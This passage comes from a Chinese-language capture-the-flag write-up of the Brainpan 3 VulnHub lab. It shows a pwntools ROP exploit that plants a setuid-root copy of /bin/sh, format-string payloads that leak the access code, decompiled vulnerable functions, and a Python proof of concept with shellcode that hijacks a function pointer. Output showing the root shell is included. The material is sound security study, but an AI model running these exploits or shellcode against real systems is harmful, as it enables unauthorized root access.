class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Create our root command file at /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">log.info(<span class="string">&#x27;Create our malicious msg file&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">r.sendline(<span class="string">&#x27;rm /tmp/pwned&#x27;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">log.info(<span class="string">&quot;Wait for your r00t shellz&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(75):</span><br><span class="line">    r.sendline(<span class="string">&#x27;ls -la /opt/.messenger&#x27;</span>)</span><br><span class="line">    sleep(1)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;pwn.msg&#x27;</span> not <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">r.sendline(<span class="string">&#x27;/tmp/pwned&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /root&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;gzip -d brainpan.8.gz&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat brainpan.8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(10):</span><br><span class="line">    r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Bingo!&quot;</span>)</span><br><span class="line">log.info(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>直接获得root权限和flag，灰常的牛批。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8455</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: Authentication successful</span><br><span class="line">[+] Insert ROP pun here...</span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Loaded 10 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;msg_admin&#x27;</span></span><br><span class="line">[*] Create our root <span class="built_in">command</span> file at /tmp/foo</span><br><span class="line">[*] <span class="built_in">echo</span> <span class="string">&quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot;</span> &gt; /tmp/foo</span><br><span class="line">[*] chmod +x /tmp/foo</span><br><span class="line">[*] Create our malicious msg file</span><br><span class="line">[*] python -c <span class="string">&quot;print &#x27;\x73\x73\x73\x73\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x6a\x61\x61\x62\x5c\xb0\x04\x08\x0a\xdc\x8d\x04\x08\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x0a&#x27;&quot;</span> &gt;&gt; /opt/.messenger/pwn.msg</span><br><span class="line">[*] Wait <span class="keyword">for</span> your r00t shellz</span><br><span class="line">[*] Bingo!</span><br><span class="line">[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">(root)</span><br><span class="line">$ </span><br><span class="line">root</span><br><span class="line">gzip: brainpan.8.gz: No such file or directory</span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub209.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub210.jpg"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>虚拟机完全启动后，使用nmap进行端口扫描。这显示了1个开放端口1337和一个封闭（防火墙）端口8080，一旦连接到端口1337，将看到Brainpan Console的登录屏幕。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.117 1337</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE:</span><br></pre></td></tr></table></figure>

<p>根据屏幕上的文字，必须处理一个4位数的代码，并且在3次失败的尝试之后，都会创建一个新的代码，因此很难对其进行暴力破解。想到的第一件事是它可能是格式字符串漏洞，并且经过快速测试表明确实如此。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %p%p%p</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbff1279c(nil)0x751</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>当使用格式字符串模式作为小数时，可以在位置3的输出中发现登录代码1873</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %d-%d-%d-%d-%d-%d-%d</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1074714724-0-1873--1074714724-0-10--367016960</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>可以将格式字符串模式缩短为％3$d，以直接获取当前的登录代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %3<span class="variable">$d</span></span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 1873</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>使用代码登录到Brainpan控制台，显示一个菜单，展示一些选项，并设置了权限，例如AUTH，REPORT和MENU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4057</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND:</span><br></pre></td></tr></table></figure>

<p>最有趣的选项是1,2和3.。4显然是一个巨魔。<br>控制台使用选项1告诉我们该构建已禁用报告功能<br>选项2告诉我们该存储库现已可用<br>选项3允许我们更改会话名称。<br>看来此选项具有格式字符串和缓冲区溢出漏洞。<br>存储库选项使我想起8080处于关闭状态的端口，快速重新扫描显示该端口现已打开，当我们浏览至该端口时，我们会看到一个简单的网页。<br>我启动了一个目录bruteforce，它显示了名为“repo”的文件夹，其中包含5个文件。</p>
<p>输入2，然后再扫描8080端口，显示已经开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 2</span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 8080 -v -sV 192.168.56.117 -r</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub201.jpg"></p>
<p>名为report的文件引起了我的注意，因为在Brainpan控制台中也有此report选项。我下载了文件并开始对其进行分析。</p>
<h3 id="分析report"><a href="#分析report" class="headerlink" title="分析report"></a>分析report</h3><p>提供所需的参数（报告数据和1或0）时，会得到一个很大的查理·布朗横幅，我不认识这个人，但我敢打赌，他是个好人。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./report aa 0</span></span><br><span class="line">               ____</span><br><span class="line">           .-<span class="string">&#x27;&amp;    &#x27;</span>-.</span><br><span class="line">          / __    __  \</span><br><span class="line">         :-(__)--(__)--;</span><br><span class="line">        (      (_       )</span><br><span class="line">         :             ;</span><br><span class="line">          \    __     /</span><br><span class="line">           `-._____.-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">             /`&quot;&quot;&quot;`\</span></span><br><span class="line"><span class="string">            /    ,  \</span></span><br><span class="line"><span class="string">           /|/\/\/\ _\</span></span><br><span class="line"><span class="string">          (_|/\/\/\\__)</span></span><br><span class="line"><span class="string">            |_______|</span></span><br><span class="line"><span class="string">           __)_ |_ (__</span></span><br><span class="line"><span class="string">          (_____|_____)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       YOU&#x27;</span>RE IN THE MATRIX</span><br><span class="line">           CHARLIE BROWN</span><br></pre></td></tr></table></figure>

<p>是时候对可执行文件使用ida进行逆向工程以查看发生了什么。</p>
<ul>
<li>main</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v4; // ST14_4</span><br><span class="line">  char dest; // [esp+18h] [ebp-68h]</span><br><span class="line">  unsigned int v6; // [esp+7Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    cb();</span><br><span class="line">    strcpy(&amp;dest, argv[1]);</span><br><span class="line">    v4 = atoi(argv[2]);</span><br><span class="line">    P = (int)REPORT;</span><br><span class="line">    N = (void *)(-sysconf(30) &amp; (unsigned int)REPORT);</span><br><span class="line">    mprotect(N, 0x1F4u, 7);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sanitize(&amp;dest);</span><br><span class="line">      encrypt(&amp;dest);</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">      record_id(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] RECORDED [%s]\n&quot;</span>, &amp;dest);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;report&gt; [0|1]\n&quot;</span>, *argv);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>sanitize</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sanitize(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !isalpha(s[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      s[i] = 63;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>encrypt</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">size_t __cdecl encrypt(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  size_t result; // eax</span><br><span class="line">  unsigned int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v4 = rand() % 9000 + 1000;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(s);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    s[i] ^= v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_data</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_data(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; // eax</span><br><span class="line">  time_t timer; // [esp+2Ch] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+30h] [ebp-58h]</span><br><span class="line">  struct tm *tp; // [esp+34h] [ebp-54h]</span><br><span class="line">  char s; // [esp+3Ah] [ebp-4Eh]</span><br><span class="line">  char dest[4]; // [esp+54h] [ebp-34h]</span><br><span class="line">  int v8; // [esp+58h] [ebp-30h]</span><br><span class="line">  int v9; // [esp+5Ch] [ebp-2Ch]</span><br><span class="line">  int v10; // [esp+60h] [ebp-28h]</span><br><span class="line">  int v11; // [esp+64h] [ebp-24h]</span><br><span class="line">  __int16 v12; // [esp+68h] [ebp-20h]</span><br><span class="line">  unsigned int v13; // [esp+7Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v13 = __readgsdword(0x14u);</span><br><span class="line">  stream = 0;</span><br><span class="line">  time(&amp;timer);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  strftime(&amp;s, 0x1Au, <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, tp);</span><br><span class="line">  memset(dest, 0, 0x28u);</span><br><span class="line">  *(_DWORD *)dest = 1836017711;</span><br><span class="line">  v8 = 1851862885;</span><br><span class="line">  v9 = 1769172577;</span><br><span class="line">  v10 = 1346720303;</span><br><span class="line">  v11 = 1398035023;</span><br><span class="line">  v12 = 47;</span><br><span class="line">  strcat(dest, &amp;s);</span><br><span class="line">  v1 = &amp;dest[strlen(dest)];</span><br><span class="line">  *(_DWORD *)v1 = 1885696558;</span><br><span class="line">  v1[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] WRITING REPORT TO %s\n&quot;</span>, dest);</span><br><span class="line">  stream = fopen(dest, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fputs(a1, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  strncpy(REPORT, a1, 0x64u);</span><br><span class="line">  <span class="built_in">return</span> feedback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_id</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_id(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+19h] [ebp-Fh]</span><br><span class="line">  int (*v3)(); // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = feedback;</span><br><span class="line">  strcpy(&amp;dest, src);</span><br><span class="line">  v3();</span><br><span class="line">  <span class="built_in">return</span> atoi(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>feedback</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int feedback()</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">&quot;[+] DATA SUCCESSFULLY ENCRYPTED&quot;</span>);</span><br><span class="line">  <span class="built_in">return</span> puts(<span class="string">&quot;[+] DATA SUCCESSFULLY RECORDED&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，代码首先检查本地主机名是否为brainpain3，并假设本地主机名是brainpain3，它将report数据复制到&amp;dest，并使用mprotect使REPORT数据可执行。之后，它检查第二个参数。</p>
<ul>
<li>1:将使用sanitize函数过滤&amp;dest中的数据，然后对其进行加密，最后使用record_data函数进行存储，该函数将数据存储到文件中，并将前100个字节复制到REPORT中。</li>
<li>2:数据将直接存储而无需任何过滤或加密，并且将调用附加函数record_id，现在这是一个有趣的函数。</li>
</ul>
<p>当查看record_id函数时，可以看到它为pfeedback分配了一个函数指针，然后将&amp;dest的内容复制到dest中，由于dest最多只能容纳3个字节，因此我们可以溢出它并控制pfeedback指针，该指针将在之后执行strcpy导致代码执行。</p>
<p>在kali中使用gdb调试如下所示</p>
<p><img src="https://r3v3rs3r.files.wordpress.com/2015/09/poc1.png"></p>
<p>因此，总结一下：因为前100个字节存储在可执行位置（REPORT），并且可以控制函数指针（pfeedback），所以可以在REPORT中存储一些shellcode，然后使pfeedback指针指向我的shellcode。可以在IDA中查找REPORT的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0804B0A0                 public REPORT</span><br><span class="line">.bss:0804B0A0 ; char REPORT[500]</span><br><span class="line">.bss:0804B0A0 REPORT          db 1F4h dup(?)          ; DATA XREF: record_data+131↑o</span><br><span class="line">.bss:0804B0A0                                         ; main+7D↑o</span><br><span class="line">.bss:0804B0A0 _bss            ends</span><br><span class="line">.bss:0804B0A0</span><br></pre></td></tr></table></figure>
<p>漏洞利用缓冲区可能类似于：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAA&lt;REPORT_address+7&gt;&lt;shellcode&gt;</span><br></pre></td></tr></table></figure>

<p>请注意，必须在REPORT地址上添加7，以越过3个A和4个字节的函数指针。</p>
<ul>
<li>python版POC代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">__REPORT = 0x0804B0A0</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p(__REPORT + 7)</span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> payload + <span class="string">&#x27; 0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行poc会按预期生成一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment">#./report $(./poc.py)</span></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20150912020038.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">$ id</span><br><span class="line">uid=1000(root) gid=1001(root) groups=1001(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),105(scanner),108(bluetooth),112(netdev),125(powerdev)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="brainpan-console-report功能"><a href="#brainpan-console-report功能" class="headerlink" title="brainpan console - report功能"></a>brainpan console - report功能</h3><p>现在，如果还记得，由于禁用了report功能，目前无法在brainpan控制台中创建report，因此必须启用它，现在这就是“update session name”选项（3）中缓冲区溢出起作用的地方。通过溢出session name缓冲区，可以控制以下值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTH   [Y]    REPORT [N]    MENU   [Y]</span><br></pre></td></tr></table></figure>

<p>通过将REPORT [N]设置为Y，将启用REPORT功能。一个模糊测试脚本可以帮助找到正确的长度，直到覆盖N</p>
